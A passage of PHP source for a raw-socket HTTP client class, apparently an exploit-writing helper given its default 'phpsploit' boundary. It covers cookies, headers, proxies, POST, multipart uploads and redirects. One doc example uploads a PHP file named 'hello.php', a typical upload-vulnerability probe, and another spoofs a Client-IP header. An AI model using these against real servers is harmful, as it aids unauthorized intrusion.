			$this->packet .= 'Content-Length: '.strlen($this->data)."\r\n\r\n";
			$this->packet .= $this->data."\r\n";
		}
		elseif($this->method=='formdata')
		{
			$this->packet .= 'Content-Type: multipart/form-data; boundary='.str_repeat('-',27).$this->boundary."\r\n";
			$this->packet .= 'Content-Length: '.strlen($this->data)."\r\n\r\n";
			$this->packet .= $this->data;
		}

		$this->packet .= "\r\n";
		$this->recv = '';

		fputs($socket,$this->packet);

		while(!feof($socket))
		   $this->recv .= fgets($socket);

		fclose($socket);

		if($this->cookiejar)
		   $this->getcookie();

		if($this->allowredirection)
		   return $this->getredirection();
		else
		   return $this->recv;
	}
	

	/**
	 * This function allows you to add several
	 * cookies in the request.
	 * 
	 * @access  public
	 * @param   string cookn CookieName
	 * @param   string cookv CookieValue
	 * @example $this->addcookie('name','value')
	 * 
	 */
	function addcookie($cookn,$cookv)
	{
		if(!isset($this->cookie))
		   $this->cookie = array();

		$this->cookie[$cookn] = $cookv;
	}


	/**
	 * This function allows you to add several
	 * headers in the request.
	 *
	 * @access  public
	 * @param   string headern HeaderName
	 * @param   string headervalue Headervalue
	 * @example $this->addheader('Client-IP', '128.5.2.3')
	 * 
	 */
	function addheader($headern,$headervalue)
	{
		if(!isset($this->header))
		   $this->header = array();
		   
		$this->header[$headern] = $headervalue;
	}


	/**
	 * This function allows you to use an
	 * http proxy server. Several methods
	 * are supported.
	 * 
	 * @access  public
	 * @param   string proxy ProxyHost
	 * @param   integer proxyp ProxyPort
	 * @example $this->proxy('localhost',8118)
	 * @example $this->proxy('localhost:8118')
	 * 
	 */
	function proxy($proxy,$proxyp='')
	{
		if(empty($proxyp))
		{
			$proxarr = explode(':',$proxy);
			$this->proxyhost = $proxarr[0];
			$this->proxyport = (int)$proxarr[1];
		}
		else 
		{
			$this->proxyhost = $proxy;
			$this->proxyport = (int)$proxyp;
		}

		if($this->proxyport > 65535)
		   die("Error: Invalid port number");
	}
	

	/**
	 * This function allows you to use an
	 * http proxy server which requires a
	 * basic authentification. Several
	 * methods are supported:
	 *
	 * @access  public
	 * @param   string proxyauth ProxyUser
	 * @param   string proxypass ProxyPass
	 * @example $this->proxyauth('user','pwd')
	 * @example $this->proxyauth('user:pwd');
	 * 
	 */
	function proxyauth($proxyauth,$proxypass='')
	{
		if(empty($proxypass))
		{
			$posvirg = strpos($proxyauth,':');
			$this->proxyuser = substr($proxyauth,0,$posvirg);
			$this->proxypass = substr($proxyauth,$posvirg+1);
		}
		else
		{
			$this->proxyuser = $proxyauth;
			$this->proxypass = $proxypass;
		}
	}


	/**
	 * This function allows you to set
	 * the 'User-Agent' header.
	 * 
	 * @access  public
	 * @param   string useragent Agent
	 * @example $this->agent('Firefox')
	 * 
	 */
	function agent($useragent)
	{
		$this->addheader('User-Agent',$useragent);
	}

	
	/**
	 * This function returns the headers
	 * which will be in the next request.
	 * 
	 * @access  public
	 * @return  string $this->header_str Headers
	 * @example $this->showheader()
	 * 
	 */
	function showheader()
	{
		$this->header_str = '';
		
		if(!isset($this->header))
		   return;
		   
		foreach($this->header as $name => $value)
		   $this->header_str .= $name.': '.$value."\r\n";
		   
		return $this->header_str;
	}

	
	/**
	 * This function returns the cookies
	 * which will be in the next request.
	 * 
	 * @access  public
	 * @return  string $this->cookie_str Cookies
	 * @example $this->showcookie()
	 * 
	 */
	function showcookie()
	{
		$this->cookie_str = '';
		
		if(!isset($this->cookie))
		   return;
		
		foreach($this->cookie as $name => $value)
		   $this->cookie_str .= $name.'='.$value.'; ';

		return $this->cookie_str;
	}


	/**
	 * This function returns the last
	 * formed http request.
	 * 
	 * @access  public
	 * @return  string $this->packet HttpPacket
	 * @example $this->showlastrequest()
	 * 
	 */
	function showlastrequest()
	{
		if(!isset($this->packet))
		   return;
		else
		   return $this->packet;
	}


	/**
	 * This function sends the formed
	 * http packet with the GET method.
	 * 
	 * @access  public
	 * @param   string url Url
	 * @return  string $this->sock()
	 * @example $this->get('localhost/index.php?var=x')
	 * @example $this->get('http://localhost:88/tst.php')
	 * 
	 */
	function get($url)
	{
		$this->target($url);
		$this->method = 'get';
		return $this->sock();
	}

	
	/**
	 * This function sends the formed
	 * http packet with the POST method.
	 *
	 * @access  public
	 * @param   string url  Url
	 * @param   string data PostData
	 * @return  string $this->sock()
	 * @example $this->post('http://localhost/','helo=x')
	 * 
	 */	
	function post($url,$data)
	{
		$this->target($url);
		$this->method = 'post';
		$this->data = $data;
		return $this->sock();
	}
	

	/**
	 * This function sends the formed http
	 * packet with the POST method using
	 * the multipart/form-data enctype.
	 * 
	 * @access  public
	 * @param   array array FormDataArray
	 * @return  string $this->sock()
	 * @example $formdata = array(
	 *                      frmdt_url => 'http://localhost/upload.php',
	 *                      frmdt_boundary => '123456', # Optional
	 *                      'var' => 'example',
	 *                      'file' => array(
	 *                                frmdt_type => 'image/gif',  # Optional
	 *                                frmdt_transfert => 'binary' # Optional
	 *                                frmdt_filename => 'hello.php,
	 *                                frmdt_content => '<?php echo 1; ?>'));
	 *          $this->formdata($formdata);
	 * 
	 */
	function formdata($array)
	{
		$this->target($array[frmdt_url]);
		$this->method = 'formdata';
		$this->data = '';
		
		if(!isset($array[frmdt_boundary]))
		   $this->boundary = 'phpsploit';
		else
		   $this->boundary = $array[frmdt_boundary];

		foreach($array as $key => $value)
		{
			if(!preg_match('#^frmdt_(boundary|url)#',$key))
			{
				$this->data .= str_repeat('-',29).$this->boundary."\r\n";
				$this->data .= 'Content-Disposition: form-data; name="'.$key.'";';
				
				if(!is_array($value))
				{
					$this->data .= "\r\n\r\n".$value."\r\n";
				}
				else
				{
					$this->data .= ' filename="'.$array[$key][frmdt_filename]."\";\r\n";

					if(isset($array[$key][frmdt_type]))
					   $this->data .= 'Content-Type: '.$array[$key][frmdt_type]."\r\n";

					if(isset($array[$key][frmdt_transfert]))
					   $this->data .= 'Content-Transfer-Encoding: '.$array[$key][frmdt_transfert]."\r\n";

					$this->data .= "\r\n".$array[$key][frmdt_content]."\r\n";
				}
			}
		}

		$this->data .= str_repeat('-',29).$this->boundary."--\r\n";
		return $this->sock();
	}

	
	/**
	 * This function returns the content
	 * of the server response, without
	 * the headers.
	 * 
	 * @access  public
	 * @param   string code ServerResponse
	 * @return  string $this->server_content
	 * @example $this->getcontent()
	 * @example $this->getcontent($this->get('http://localhost/'))
	 * 
	 */
	function getcontent($code='')
	{
		if(empty($code))
		   $code = $this->recv;

		$code = explode("\r\n\r\n",$code);
		$this->server_content = '';
		
		for($i=1;$i<count($code);$i++)
		   $this->server_content .= $code[$i];

		return $this->server_content;
	}

	
	/**
	 * This function returns the headers
	 * of the server response, without
	 * the content.
	 * 
	 * @access  public
	 * @param   string code ServerResponse
	 * @return  string $this->server_header
	 * @example $this->getcontent()
	 * @example $this->getcontent($this->post('http://localhost/','1=2'))
	 * 
	 */
	function getheader($code='')
	{
		if(empty($code))
		   $code = $this->recv;

		$code = explode("\r\n\r\n",$code);
		$this->server_header = $code[0];
		
		return $this->server_header;
	}

	
	/**
	 * This function is called by the
	 * cookiejar() function. It adds the
	 * value of the "Set-Cookie" header
	 * in the "Cookie" header for the
	 * next request. You don't have to
	 * call it.
	 * 
	 * @access private
	 * @param  string code ServerResponse
	 * 
	 */
	function getcookie()
	{
		foreach(explode("\r\n",$this->getheader()) as $header)
		{
			if(preg_match('/set-cookie/i',$header))
			{
				$fequal = strpos($header,'=');
				$fvirgu = strpos($header,';');
				
				// 12=strlen('set-cookie: ')
				$cname  = substr($header,12,$fequal-12);
				$cvalu  = substr($header,$fequal+1,$fvirgu-(strlen($cname)+12+1));
				
				$this->cookie[trim($cname)] = trim($cvalu);
			}
		}
	}


	/**
	 * This function is called by the
	 * get()/post() functions. You
	 * don't have to call it.
	 *
	 * @access  private
	 * @param   string urltarg Url
	 * @example $this->target('http://localhost/')
	 * 
	 */
	function target($urltarg)
	{
		if(!ereg('^http://',$urltarg))
		   $urltarg = 'http://'.$urltarg;
		   
		$urlarr     = parse_url($urltarg);
		$this->url  = 'http://'.$urlarr['host'].$urlarr['path'];
		
		if(isset($urlarr['query']))
		   $this->url .= '?'.$urlarr['query'];
		
		$this->port = !empty($urlarr['port']) ? $urlarr['port'] : 80;
		$this->host = $urlarr['host'];
		
		if($this->port != '80')
		   $this->host .= ':'.$this->port;

		if(!isset($urlarr['path']) or empty($urlarr['path']))
		   die("Error: No path precised");

		$this->path = substr($urlarr['path'],0,strrpos($urlarr['path'],'/')+1);

		if($this->port > 65535)
		   die("Error: Invalid port number");
	}
	
	
	/**
	 * If you call this function,
	 * the script will extract all
	 * 'Set-Cookie' headers values
	 * and it will automatically add
	 * them into the 'Cookie' header
	 * for all next requests.
	 *
	 * @access  public
	 * @param   integer code 1(enabled) 0(disabled)
	 * @example $this->cookiejar(0)
	 * @example $this->cookiejar(1)
	 * 
	 */
	function cookiejar($code)
	{
		if($code=='0')
		   $this->cookiejar=FALSE;

		elseif($code=='1')
		   $this->cookiejar=TRUE;
	}


	/**
	 * If you call this function,
	 * the script will follow all
	 * redirections sent by the server.
	 * 
	 * @access  public
	 * @param   integer code 1(enabled) 0(disabled)
	 * @example $this->allowredirection(0)
	 * @example $this->allowredirection(1)
	 * 
	 */
	function allowredirection($code)
	{
		if($code=='0')
		   $this->allowredirection=FALSE;
		   
		elseif($code=='1')
		   $this->allowredirection=TRUE;
	}

	
	/**
	 * This function is called if
	 * allowredirection() is enabled.
	 * You don't have to call it.
	 *
	 * @access private
	 * @return string $this->get('http://'.$this->host.$this->path.$this->last_redirection)
	 * @return string $this->get($this->last_redirection)
	 * @return string $this->recv;
	 * 
	 */
	function getredirection()
	{
		if(preg_match('/(location|content-location|uri): (.*)/i',$this->getheader(),$codearr))
		{
			$this->last_redirection = trim($codearr[2]);
			
			if(!ereg('://',$this->last_redirection))
			   return $this->get('http://'.$this->host.$this->path.$this->last_redirection);

			else
			   return $this->get($this->last_redirection);
		}
		else
		   return $this->recv;
	}


	/**
	 * This function allows you
	 * to reset some parameters.
	 * 
	 * @access  public
	 * @param   string func Param
	 * @example $this->reset('header')
	 * @example $this->reset('cookie')
	 * @example $this->reset()
	 * 
	 */
	function reset($func='')
	{
		switch($func)
		{
			case 'header':
			$this->header = array();
			break;
				
			case 'cookie':
			$this->cookie = array();
			break;
				
			default:
			$this->cookiejar = '';
			$this->header = array();
			$this->cookie = array();
			$this->allowredirection = '';
			break;
		}
	}
}

?>